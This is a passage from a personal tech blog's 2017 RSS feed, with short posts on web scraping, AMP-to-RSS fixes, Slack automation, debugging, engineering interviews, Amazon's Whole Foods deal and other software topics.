<p>On one hand it’s possible to make a solid living as a software engineer that ties various third party libraries together in order to deliver new features. This is by no means easy and requires a solid understanding of software architecture and the ability to quickly process spartan documentation combined with the ability to write code in a futureproof way. At the same time this is very different than pushing the boundaries of a discipline.</p>

<p>It’s definitely possible to specialize in more than one area or switch among them but it requires significant effort and will only get more difficult over time. I don’t know what this means other than to be thoughtful about the roles you’re taking and whether they’re something you want to keep specializing in.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Yahoo fantasy football stats: 2017-2018 edition</title>
   <link href="http://dangoldin.com/2017/07/08/yahoo-fantasy-football-stats-2017-2018-edition/"/>
   <updated>2017-07-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/08/yahoo-fantasy-football-stats-2017-2018-edition</id>
   <content:encoded><![CDATA[
<p>In what has become an annual tradition I updated my Yahoo Fantasy Football scraping bot for the 2017-2018 season. Every year Yahoo makes a few changes to their page and this year was no different. It’s always fun to cross my fingers, run the script, and see what breaks. This year the changes were surprisingly minor. For some reason Yahoo changed the name attribute of the password field from “passwd” to “password” and made a few tweaks to the table structure which required updating the XPath selectors. Other than that everything worked as expected and the 2017-2018 data is available <a href="http://dangoldin.com/assets/static/data/stats-2018.csv">here</a> with the code up on <a href="https://github.com/dangoldin/yahoo-ffl">GitHub</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Thoughtful code</title>
   <link href="http://dangoldin.com/2017/07/04/thoughtful-code/"/>
   <updated>2017-07-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/04/thoughtful-code</id>
   <content:encoded><![CDATA[
<p>Lately I’ve found myself thinking more deeply about the code I’m writing. No matter how small the task or script I’ll think through the implications of my approach and whether I should be doing anything differently. This doesn’t mean I’ll always pick the more correct and flexible approach and more often than not I’ll choose the quick and dirty one to save time but the thought process itself is valuable since it gets me in the habit of questioning and constantly improving my code. The following is an example that illustrates this approach.</p>

<p>Years ago I wrote a <a href="https://yahnr.dangoldin.com/">basic app</a> that shows the most popular Hacker News stories over a 24 hour period. It crawls the Hacker News homepage every 15 minutes and parses the DOM in order to track a story’s total points along with a few additional stats. It’s an extremely simple script that’s been running unchanged for multiple years. And yet a few days ago while checking up on it I discovered that there was a minor bug - there was a small change to the HTML structure which caused the number of comments to no longer be parsed.</p>

<p>The screenshot below shows a typical Hacker News entry - the top row contains the title and the domain and the bottom row has the points, the submitter, and the comments. Looking at the source code we can see that the number of comments is part of the last &lt;a&gt; entry in the bottom row.</p>

<img src="http://dangoldin.com/assets/static/images/hn-example-row.png" width="862" height="76" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/hn-row-html.png" width="854" height="514" layout="responsive"/>

<p>When I wrote the code years ago it was the second entry so all my code did was look at the second &lt;a&gt; element and extract the number. At some point over the past few years the flag and hide options were added which caused my logic to fail. The fix was to look at the new element containing the comments but there are multiple ways to handle it. The simplest is to just realize it’s the 4th element and go off of that - but once again if the structure changes we will run into the same issue we just did. Another approach is look at the last element in which case we’ll be good as long as the comments element is always the last one. Yet another approach is to go through each of the cells and search for the “comment” string. If we find it then we use that cell, otherwise we move on until we do. This will work no matter where the comments section since we’re going through each one. With significant effort, one can even extend this into a learning system that is able to infer where the various bits of content are in a wide range of possible structures. There’s no right answer and it’s a series of tradeoffs but it illustrates how there’s significant depth and choice in the simplest of coding problems. Hundreds of these seemingly minor choices occur every time we write a script and thousands when writing a large project. Getting into the habit of questioning our choices is how we end up writing wonderful code as a habit.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Send private messages to all members of a Slack channel</title>
   <link href="http://dangoldin.com/2017/06/30/send-private-messages-to-all-members-of-a-slack-channel/"/>
   <updated>2017-06-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/30/send-private-messages-to-all-members-of-a-slack-channel</id>
   <content:encoded><![CDATA[
<p>One of my more recent “management automation” tricks was to write a simple script that gets all active members of a Slack channel and then sends them a direct message. I’ll often want to poll the entire team and ask them to fill out a survey or submit a questionnaire but the response rates tend to be poor. But if I send a message to people directly I end up with a much better response rate. It turns out that in my case I was able to get a greater than 100% improvement in response rate by using this approach. In a group channel there’s a lot going on so it’s likely that some people don’t see the message or decide they’ll do it later but inevitably forget. But by messaging them directly it sends a pretty strong signal that I care about the response and prompts people to just get it done. Despite the success I am hesitant to overuse it since it may lead to people ignoring these direct messages as well. As they say, with great power comes great responsibility. As usual, the code is up on <a href="https://github.com/dangoldin/automating-management/blob/master/spam_channel_members.py">GitHub</a> and suggestions and pull requests are welcome.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>RSS finally fixed</title>
   <link href="http://dangoldin.com/2017/06/26/rss-finally-fixed/"/>
   <updated>2017-06-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/26/rss-finally-fixed</id>
   <content:encoded><![CDATA[
<p>Last week’s post highlighting my victory getting AMP working in RSS was a bit premature since it turns out my solution only worked locally. While being powered by Jekyll, GitHub Pages doesn’t support custom plugins which I was using to replace the “amp-img” tags with “img” when generating the XML feed. So while my approached worked when generating the blog locally it silently ignored my custom template tags when pushed to GitHub.</p>

<p>GitHub support was incredibly helpful here and provided me the exact steps I needed to get it working. Turns out that you can configure GitHub Pages to disable the Jekyll build and just serve content that’s within the “docs” folder of your repo. After adding the built directory to the repo and updating the settings everything’s working great.</p>

<p>Ironically, after reading Alex Kras’s <a href="https://www.alexkras.com/i-decided-to-disable-amp-on-my-site/">post on disabling AMP</a> I’m tempted to do the same. The blog is pretty minimal and there’s no real reason for me to use AMP other than my curiosity. It’s significantly faster than what I had before but I’m sure if I take the time I can replace AMP with something much better and easier to maintain. But then all the wonderful hacks I had to do to get AMP working disappear.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Unsubscribe and wait 10 days</title>
   <link href="http://dangoldin.com/2017/06/24/unsubscribe-and-wait-10-days/"/>
   <updated>2017-06-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/24/unsubscribe-and-wait-10-days</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/unsubscribe-10-days.png" alt="Unsubscribe and wait 10 days" width="788" height="216" layout="responsive"/>

<p>We live in a world of miraculous technology and yet it “may take up to 10 days” for me to unsubscribe from a mailing list. I have no clue what needs to happen to remove my email from a mailing list but it feels as if they’re using the <a href="https://en.wikipedia.org/wiki/Pony_Express">Pony Express</a>. If someone built a system that takes 10 days to deactivate an email address whoever built that system should not be writing any code. Modern systems are able to deal with billions of events a second and support millions of concurrent users but somehow updating a field in a database takes up to 10 days?</p>

<p>Of course it’s not just the code and there are business reasons for this but I can’t get over the fact that unsubscribing from a mailing list takes that long. I suspect the actual reasons are that they want to open up the tiny possibility that I may get an email over the next few days that get me resubscribe and that they may have a variety of systems that have my email address that would need to be purged. In any case it’s a bit ridiculous that it takes that long. Every time I unsubscribe and see a message that indicates it’s not immediate I cry inside.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Apple's ARKit</title>
   <link href="http://dangoldin.com/2017/06/22/apples-arkit/"/>
   <updated>2017-06-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/22/apples-arkit</id>
   <content:encoded><![CDATA[
<p>During this year’s WWDC Apple announced <a href="https://developer.apple.com/arkit/">ARKit</a>, a development framework that simplifies the ability of incorporating augmented reality into your app. I’ve been fascinated by this for a while and took a stab at getting their code running. I’ve only dabbled in iOS development so the bulk of the effort involved getting the latest Xcode beta and then discovering to run the full example I needed to upgrade my phone to run the iOS 11 beta. After this the included ARKit example worked perfectly and left me pleasantly surprised. It worked remarkably well and highlighted how powerful ARKit can be; I’ve included some sample screenshots below. Snapchat had to invest the time and effort to develop their filters but ARKit will make that significantly easier for future developers. This is an extremely powerful move by Apple since it’s all about the apps and this gives app developers a tool unique to iOS. I have a lot to learn here but I’m excited to get deeper into the augmented reality world. I remember playing with VRML in the 90s and I consider this an extension of my childhood interests.</p>

<img src="http://dangoldin.com/assets/static/images/arkit-1.JPG" alt="ARKit 1" width="488" height="867" layout="responsive"/>
<img src="http://dangoldin.com/assets/static/images/arkit-2.JPG" alt="ARKit 2" width="488" height="867" layout="responsive"/>
<img src="http://dangoldin.com/assets/static/images/arkit-3.JPG" alt="ARKit 3" width="488" height="867" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Getting AMP into RSS</title>
   <link href="http://dangoldin.com/2017/06/20/getting-amp-into-rss/"/>
   <updated>2017-06-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/20/getting-amp-into-rss</id>
   <content:encoded><![CDATA[
<p>A little less than a year ago I <a href="http://dangoldin.com/2016/09/05/ampifying-my-blog/">migrated</a> this blog over to <a href="https://www.ampproject.org/">AMP</a> which required a lot of small tweaks - ranging from automating the markup changes to getting the Disqus plugin to work. One thing I didn’t get a chance to finish until earlier this week was supporting the RSS feed. This blog is hosted on GitHub pages which is powered by Jekyll and comes with a pretty powerful templating engine. One of the predefined templates was the ability to generate an RSS atom feed. It worked by taking the content of each post, escaping it, and concatenating them together into a massive XML file.</p>

<p>With standard pages this approach worked great but fails with AMP since AMP has it’s own markup that isn’t supported by common RSS readers. The biggest problem is that AMP uses the &lt;amp-img&gt; tag to include images while standard HTML has the simple &lt;img&gt; tag. This led to the text content loading fine but none of the images making their way through. Luckily, Jekyll provides a simple way of creating your own template tags and I came up with a super simple one to just do a global replace of amp-img with img. This isn’t a perfect solution since the amp-img tag contains some additional functionality but it’s good enough for getting the images to make their way back into the RSS feed. While testing the XML generation I also realized that the img tags were still using relative paths which is fine when consumed via the browser but not so great when done via an RSS reader. A tag later and this is fixed. I’m hopeful that this is the last of my blog’s AMPification but if there’s anything odd still happening do let me know.</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">module</span> <span class="nn">AMPToImgFilter</span>
  <span class="c1"># Very naive for now</span>
  <span class="k">def</span> <span class="nf">amp_to_img</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
    <span class="n">html</span><span class="p">.</span><span class="nf">gsub!</span> <span class="s1">'amp-img'</span><span class="p">,</span> <span class="s1">'img'</span>
  <span class="k">end</span>
<span class="k">end</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-html" data-lang="html"> 
<span class="c">&lt;!-- Use the custom tags --&gt;</span>
<span class="nt">&lt;content</span> <span class="na">type=</span><span class="s">"html"</span><span class="nt">&gt;</span>{{ post.content | amp_to_img | relative_to_absolute_paths | xml_escape }}
 </code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Investigating application issues</title>
   <link href="http://dangoldin.com/2017/06/17/investigating-application-issues/"/>
   <updated>2017-06-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/17/investigating-application-issues</id>
   <content:encoded><![CDATA[
<p>A skill that seems lacking is the ability to debug large scale applications. Most people are comfortable looking at exceptions or log files and working their way back to an issue in the code but given the complexity of modern applications that’s not enough. These days applications are hosted across dozens of cloud instances while utilizing a ton of cloud services. This makes it easier to ship applications but also makes it more difficult to isolate and identify issues since they’re no longer isolated to a single service or application. When there are dozens of instances and dozens of services talking to one another an issue in one system may manifest itself as a phantom issues in others which can lead to a significant amount of wasted investigative effort.</p>

<p>Exploring large system issues follows the same approach as investigating small issues but the toolset is different. They both start of by coming up with a hypothesis that may explain the situation we’re seeing and then a series of steps to either confirm or reject our conjecture. If it’s rejected hopefully we’ve picked up enough clues along the way to come up with another hypothesis. And this cycle repeats until we’ve figured out what the root problem was.</p>

<p>In both cases you’ll be much quicker at getting at the cause if your hypotheses are intelligent. This can only happen if you have a good understanding of the system architecture and the way the data flows from one service to another. Without this knowledge you’ll be guessing and exploring blindly.</p>

<p>Application bugs provide exceptions and logs that help us dig into problems but larger architectures require more. I’ve found high level metrics and charts to be incredibly helpful in coming up and exploring my guesses without even having to dig into the application itself. Using AWS, and surely other cloud providers, one can get high level metrics as to what’s happening with each instance or hosted service. This may be the CPU usage, the amount of data going in and out, the number of requests - you name it. Each of these provide a data point as well as a timeline that can quickly highlight the issue. But once again these are only useful if you know how the various pieces fit together.</p>

<p>While most companies have dedicated DevOps engineers making sure things are running smoothly I believe every engineer should have an understanding of the overall application and where their contributions fit in. This knowledge helps both in writing more intelligent code and digging into system-wide issues when they arise.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Amazon juggernaut</title>
   <link href="http://dangoldin.com/2017/06/16/the-amazon-juggernaut/"/>
   <updated>2017-06-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/16/the-amazon-juggernaut</id>
   <content:encoded><![CDATA[
<p>Earlier today Amazon announced that it is acquiring Whole Foods. I can’t count how many different lines of business Amazon has but this is yet another step in its quest to capture every consumer dollar spent. Unsurprisingly, people spend the most on <a href="https://www.bls.gov/news.release/cesan.nr0.htm">necessities</a> which is basically food and housing followed by clothing and transportation. In 2015, a whopping $600B was <a href="https://www.statista.com/topics/1660/food-retail/">spent at grocery stores</a> in the US - and this doesn’t include eating or drinking out. Amazon has massive ambitions and getting into these categories is a necessity. Amazon has already been getting into food and clothing but this is a huge step into the brick and mortar world which will open up a ton of possibilities.</p>

<p>There have been a lot of interesting observations about the value this acquisition brings Amazon. These range from giving Amazon distribution locations in urban areas to doubling down on grocery delivery with AmazonFresh. I like to think that the fact that anyone can come up with a justification is proof enough that the acquisition makes sense. This is especially the case given Amazon’s history of jumping into adjacent markets and businesses. Relentlessly executing in one area gives Amazon the ability to leverage that experience and infrastructure to attempt something new (Brad Stone does an incredible job of covering this in <a href="https://www.amazon.com/Everything-Store-Jeff-Bezos-Amazon-ebook/dp/B00BWQW73E">The Everything Store</a>). Amazon started with books, introduced other goods, then after figuring out their logistics expanded this to third party sellers. And in their spare time they somehow managed to build AWS. No one but Amazon knows how Whole Foods fits into Amazon’s vision but I wouldn’t be surprised if this leads to even more Amazon domination.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mary Meeker's Internet Trends 2017</title>
   <link href="http://dangoldin.com/2017/06/04/mary-meekers-internet-trends-2017/"/>
   <updated>2017-06-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/06/04/mary-meekers-internet-trends-2017</id>
   <content:encoded><![CDATA[
<p>In what has become annual tradition, Mary Meeker has just published the <a href="http://dq756f9pzlyr3.cloudfront.net/file/Internet+Trends+2017+Report.pdf">2017 Internet Trends report</a> and it’s a whopper. Over 350 pages describing the state of the modern digital world. I can’t imagine how long it must have taken to pull the data and put it together but I’m incredibly grateful that it’s been done and continues to be done every year. There’s so much great stuff in there that it’s worth going through it on your own but I wanted to highlight the slides that stood out to me.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-advertising-tv.png" alt="Digital vs tv advertising" width="1910" height="1432" layout="responsive"/>
      <p class="caption">Digital advertising has finally surpassed TV with a much higher slope. This also indicates total ad spend is growing. I'm surprised that TV advertising hasn't started dropping.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-google-fb-ad.png" alt="Google vs FB vs others" width="1914" height="1428" layout="responsive"/>
      <p class="caption">While the entire online advertising industry is growing Google and Facebook are taking up the lion's share. The rich get richer.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-adblock.png" alt="Adblock rates" width="1910" height="1434" layout="responsive"/>
      <p class="caption">Adblocking is growing but it's incredible to see how it varies by country and device type. The Western world is all about adblock on desktop but Asia is all about adblock on mobile. It's incredible that Indonesia has an adblock rate of 58% on mobile.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-how-it-works.png" alt="How do things work?" width="1910" height="1426" layout="responsive"/>
      <p class="caption">I just found this interesting and it makes sense given that we're doing so much shopping online and need more proof that we're not being scammed.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-landlord-storage.png" alt="Landlords need more storage space" width="1914" height="1434" layout="responsive"/>
      <p class="caption">Another interesting slide that just highlights the secondary effects the internet is having. I can imagine building lobbies being completely swamped and needing to adapt to much higher shipping volumes.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-stitchfix-ai-clothing.png" alt="Stitchfix selling AI generated clothing" width="1908" height="1428" layout="responsive"/>
      <p class="caption">Pretty cool seeing designs generated by machines based on data. I expect to see much more of this even the ability to create one off designs per customer based on their unique profile.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-netflix.png" alt="Netflix is growing quickly" width="1912" height="1430" layout="responsive"/>
      <p class="caption">Compared to the old media companies Netflix is growing incredibly quickly. Other than the Discovery channel every other old company is dropping in minutes watched.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-netflix-2.png" alt="But it's still small" width="1914" height="1430" layout="responsive"/>
      <p class="caption">Despite that Netflix is still small compared to the major social network companies.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-ux-ratio.png" alt="Designers vs engineer ratio" width="1910" height="1424" layout="responsive"/>
      <p class="caption">UX is becoming increasingly important and companies are starting to realize this by improving their designer to engineer ratios.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-china-gaming.png" alt="Gaming is huge in China" width="1910" height="1434" layout="responsive"/>
      <p class="caption">The next few just highlight the scale of China and India. In this case despite the average GDP of China being significantly lower than the USA it has such a large population that the total gaming revenue surpasses that of the US.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-china-transportation.png" alt="On demand transportation in China" width="1908" height="1430" layout="responsive"/>
      <p class="caption">Similar with on demand transportation. We talk about Uber taking over the world but China has more on demand car and bike trips than the rest of the world combined.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-india-penetration.png" alt="Internet in India" width="1910" height="1430" layout="responsive"/>
      <p class="caption">India has a similar population to China but is much further behind in adoption. Fewer than 30% of the population is online and it's crazy to imagine what will happen when it gets closer to 100%.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-mobile-usage.png" alt="Mobile usage" width="1912" height="1434" layout="responsive"/>
      <p class="caption">Another example of how different the developing world is. The developing world is mobile first - which probably explains the significantly higher rates of mobile adblocking.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/mm-age-income-distribution.png" alt="Mobile usage" width="1908" height="1426" layout="responsive"/>
      <p class="caption">India has a massive opportunity here given how young its population is. In the US peak income is achieved in people's 50s while in India and China it's in the 20s and 30s. It's hard to fathom what this means for the future.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Learn from failure, not success</title>
   <link href="http://dangoldin.com/2017/05/30/learn-from-failure-not-success/"/>
   <updated>2017-05-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/30/learn-from-failure-not-success</id>
   <content:encoded><![CDATA[
<p>Maybe it’s due to all the Sherlock Holmes I read as a kid but I enjoy the process of debugging and exploring technical outages and failures. The more cryptic and challenging the problem the more fun it is to sink my teeth into and the more rewarding it is when I finally get to the root cause. The real benefit of going through failures is that it is one of the best ways to get familiar with a tool or a technology. When things work we often only get a superficial understanding of the technology since we have no reason to go beyond the surface. When things fail, on the other hand, we’re forced to dig deep until we understand the cause of the failure and can make the necessary modifications to prevent the same issues in the future.</p>

<p>Digging through a problem makes us understand how sensitive many of our systems are and what sorts of edge cases will cause them to break. Rather than thinking about failures we often get tunnel vision and build something to work in a perfect world where everything is going to come in as expected. Outages break us out of this optimism and get us to actually think about and build for the real world.</p>

<p>Anna Karenina starts with the sentence “All happy families are alike; each unhappy family is unhappy in its own way” and the equivalent version for software engineering is “All functional code is alike, each dysfunctional code is dysfunctional in its own way.” Rather than getting frustrated at broken systems we should use them as an opportunity to learn since we’re not going to get that from a perfect system.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Engineering, product, and design</title>
   <link href="http://dangoldin.com/2017/05/27/engineering-product-and-design/"/>
   <updated>2017-05-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/27/engineering-product-and-design</id>
   <content:encoded><![CDATA[
<p>The best products are built when engineering, product, and designers work together. When things are running smoothly each brings skill, knowledge, and experience the others cannot. When things are running poorly the teams do not respect or trust each other and question the others’ approach and decision making. Inevitably this leads to a flawed product that doesn’t solve customer needs and gets replaced by one that does. It’s possible to ride previous success through inertia, marketing, and price but to grow in the modern era you need to focus on product.</p>

<p>One of the best ways to maintain this mutual respect and collaboration is by ensuring that there’s a skill overlap between the various groups. If an engineer has no insight in the design process she won’t be able to put herself in the designer’s shoes and understand the effort involved. Similarly, if a product manager doesn’t have some understanding of code it will be difficult to estimate complexity and potential tradeoffs without working directly with an engineer. It’s easy to dismiss others’ work as easy until you try to do it yourself and then you realize that there’s unforeseen intricacy and depth. At that point you develop an appreciation for the work others do and can follow along with the process.</p>

<p>Teams are most productive when everyone trusts and respects others and allows them to work uninterruptedly on their components. Ironically, this is achieved by having some experience in another’s domain since that’s how you start to truly value their contribution. Having this additional knowledge also gives you enough context to push back and collaboratively come up with a better solution than would have developed independently.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>IVR to SMS</title>
   <link href="http://dangoldin.com/2017/05/25/ivr-to-sms/"/>
   <updated>2017-05-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/25/ivr-to-sms</id>
   <content:encoded><![CDATA[
<p>Seems it’s all about messaging now and yet we somehow still have the ridiculous automated call systems which the industry calls interactive voice response. Every single person I know hates having to call a customer support number only to hear a robotic voice that requires a series of frustrated enunciations to get what you wanted. I understand that it’s a huge win in terms of cost savings since you’re replacing people with software but moving over to SMS and asynchronous messaging would make it a better experience at an even lower cost.</p>

<p>The voice systems would no longer need to maintain a synchronous phone call connection and would be able to respond to messages asynchronously. In addition, translating and acting on text is much easier than having to do voice transcription and would lead to more powerful functionality rather than the usual yes/no questions. The end-to-end speed would also be improved since reading is quicker than listening. This can lead to better information density and provide more expansive options than what you’d be limited to with an automated voice system. Being asynchronous also allows people to take their time and find whatever they need without being pressured by the time constraint.</p>

<p>I’m honestly shocked that this hasn’t taken over the world yet. I did a Google search and it seems there are a few companies in the space but it’s surprising that companies aren’t scrambling to move their IVR systems to SMS.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Type dependent databases</title>
   <link href="http://dangoldin.com/2017/05/23/type-dependent-databases/"/>
   <updated>2017-05-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/23/type-dependent-databases</id>
   <content:encoded><![CDATA[
<p>I’m a huge proponent of strong types when it comes to coding. Unless it’s a throwaway project it’s always worth spending the extra time to define your objects and the way they will be exposed in the code. This investment makes it more likely that you’ve thought through the way the code will need to evolve and the various edge cases you need to handle.</p>

<p>This philosophy is even more important when thinking about your database structure since that’s going to be even more difficult to change than your code. Changing the code requires a deploy while changing a database schema will require a migration and a series of corresponding code changes.</p>

<p>Just last week I came across a language called <a href="https://en.wikipedia.org/wiki/Idris_(programming_language)">Idris</a> that supports a concept called <a href="https://en.wikipedia.org/wiki/Dependent_type">dependent types</a>. With dependent types one is able to make type definitions that depend on the values themselves - thus a type can be a list where the numbers add up to a particular sum or a an array that requires its elements to be in increasing order. I definitely don’t have a lot of practice or experience with these but I find the concept incredibly powerful. The more constraints we can shift to the type definitions the simpler and more declarative the code gets.</p>

<p>I would love to see this concept extended to databases. I already spend a fair amount of time thinking through database schemas and being able to impose more rules that are enforced at the database level would make databases much more powerful. Right now we spend a ton of time validating our data through APIs and code but imagine being able to have this done at the database level. Databases already provide simple rules around nulls, uniqueness constraints, and foreign keys but nothing about the relationship between fields within a single row. Then all the rules that are implemented in code can be moved upstream to the database, saving a ton of time, improving performance, and simplifying the code.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Copying production SQL data to other environments</title>
   <link href="http://dangoldin.com/2017/05/20/copying-production-sql-data-to-other-environments/"/>
   <updated>2017-05-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/20/copying-production-sql-data-to-other-environments</id>
   <content:encoded><![CDATA[
<p>I suspect most developers have encountered this problem at least once: how do I copy some production data to my test or development environment? This can stem from needing to fix a bug that only manifests in production or just getting a more complicated, real-world dataset that doesn’t yet exist in the test environment. In an ideal world we’d have everything we need in fixtures and properly tested but in the cases we don’t it seems simpler to just copy the data over from the production environment.</p>

<p>This turns out to be surprisingly difficult. The simple cases are easy but it spirals into a world of pain very quickly. To do a proper copy you also need to copy all the dependents and dependencies since they will influence the behavior. Then for each of those you need to do the same thing and keep repeating until you’ve copied over the entire chain. Many ORMs allow you to specify the foreign keys which can be used to figure out the dependency chain; otherwise you need to manually specify the table relationships.</p>

<p>That was the easy part, now you have to handle the fact that the primary keys between the two databases will be different. On one hand you may copy over a row with some values that will violate the constraints of the destination table. On the other hand the data may copy over without any issues but you’ll end up with existing objects referencing this new data. At this point you’re squeezed on both sides.</p>

<p>Now imagine you have references to the data in external systems. This can be additional data that’s kept in another database mapped by ids or content stored on S3. At this point you have to decide what the minimum amount of data it is you need to migrate to do what you need and whether it’s easier to just recreate the production conditions on your environment. More often than not you’re better off skipping the migration and just doing the dirty work of replicating the same configuration on your environment. It ensures your database stays internally consistent and actually gives you a proper scenario to test against outside of production that can be part of your test suite.</p>

<p>As an exercise, I took a <a href="https://github.com/dangoldin/db-tools/blob/master/migrate.py">stab at writing a script</a> to do this sort of recursive migration. The initial parts were pretty straightforward and I was able to write a simple script that did a recursive migration using an explicitly specified table to table relationship mapping. At the moment the script is unable to handle foreign key constraint violations but in theory it should be possible to resolve this with an exhaustive definition of the table relationships and designing the appropriate execution order. It was a fun, little exercise that confirmed it’s much easier to recreate the objects than to try migrating the data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The different flavors of engineering interviews</title>
   <link href="http://dangoldin.com/2017/05/17/the-different-flavors-of-engineering-interviews/"/>
   <updated>2017-05-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/17/the-different-flavors-of-engineering-interviews</id>
   <content:encoded><![CDATA[
<p>Technical interviews often come in a variety of flavors and I thought it would be interesting to list as many as I can think of and my thoughts on each one. In general I think there’s value in each type of approach but some are going to be more appropriate than others depending on the person’s experience and role.</p>

<ul>
  <li>Brainteaser. These are seemingly simple problems that require a trick or insight to get them right. If you’ve heard it before or are familiar you can blow through these otherwise you’ll need to rely on a series of hints to get to the final answer. Probably not the best way to judge someone’s ability since it’s likely removed from the work they’ll actually be doing.</li>
  <li>Data structures. A bit more legitimate than the brainteaser approach this question digs into your knowledge of data structures. These usually start with some sense of complexity and then end up in implementing some type of traversal or tree search. The theory and knowledge of these is important but it’s pretty rare to have to implement a low level data structure.</li>
  <li>Architecture. This moves higher level and asks you to think about designing a larger application. How would the various components look? If it’s a service what endpoints would be exposed? What are the arguments and results for each of the calls? How would you scale this? What if you needed to make changes? These are a useful way to see how someone thinks and whether they have some familiarity thinking through the architectures of large and complex systems.</li>
  <li>Technical. Depending on the domain this gets into the nuances of a language or technology. These range from a rapid fire style that’s asking for descriptions of various HTTP status codes to a deeper dive into the TCP/IP protocol to discussing high level networking or the nuances of particular language or application versions. The goal here is to quickly get a sense if the person knows what they’re talking about or whether there’s only a superficial knowledge. Used alongside some of the other approaches this is a solid way of gauging the accuracy of a resume.</li>
  <li>Code test. This is the typical code test where you’re given a problem, a computer, and a time limit. Hopefully the problem is simple enough and offers a variety of implementation options that allow you to see the thought and decision process. The most successful ones involve introducing the problem and making sure everyone is on the same page and an occasional check-in to answer and address any questions. The difficulty here is that not everyone can code in a high pressure environment and you may be missing out on a lot of great people that are strong coders but don’t do well on code tests.</li>
  <li>Pair programming. A variation of the code test that tries to make it a bit less stressful is to do a pairing exercise where you’re both working on a problem and bouncing ideas off of one another. The goal is to have the candidate do most of the coding and you act as a sounding board since you do want to get a sense of the person’s coding ability. This also serves the benefit of showing you whether you’d get along since it’s a quick glimpse into how you’d work together on the same project.</li>
  <li>Feature addition. This is working with someone on the production code to build out a simple feature. Pair programming is usually done on a predefined problem but this takes an actual problem you’re working on and turns it into a pairing exercise. I haven’t seen this done much since it usually requires a ton of context to ramp someone up to your codebase and every person ends up with a different experience. Nice in theory but I don’t know how well it works in practice.</li>
  <li>Unit test fixing. I’ve seen this done a few times and it’s usually set up as a fully written project with a few broken unit tests. It’s your job to go through the underlying code and fix it to get the unit tests to pass. I like this one since it tests something everyone needs to do - go through someone else’s code, understand what it’s trying to do, and make some enhancements without breaking the existing functionality. This requires a fair amount of setup work, especially if you need to support multiple languages, but it’s a great way of testing the skills any developer should have.</li>
</ul>

<p>The goal of every interview is to make sure the person you’re interviewing will be successful at their job. The best way is to give them something that’s as close to the job itself as possible. If they succeed it’s likely they’ll be able to do the job itself and if they fail it’s likely they wouldn’t be able to cut it. The implication is that you need to structure your process to optimize for this. No single one of these will tell you everything you need to know so it’s important to mix and match to find the combination that gives you the most confidence in your process.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In praise of the polymath</title>
   <link href="http://dangoldin.com/2017/05/13/in-praise-of-the-polymath/"/>
   <updated>2017-05-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/13/in-praise-of-the-polymath</id>
   <content:encoded><![CDATA[
